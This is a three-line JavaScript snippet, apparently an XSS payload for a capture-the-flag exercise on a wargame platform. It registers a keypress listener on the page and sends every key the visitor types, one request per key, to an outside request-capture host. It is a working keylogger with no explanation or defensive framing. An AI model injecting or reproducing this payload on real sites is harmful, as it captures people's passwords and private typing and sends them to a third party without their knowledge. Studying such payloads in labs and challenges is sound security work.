document.addEventListener('keypress', e => {
  fetch("https://uuycbsp.request.dreamhack.games/log?k="+e.key);
});
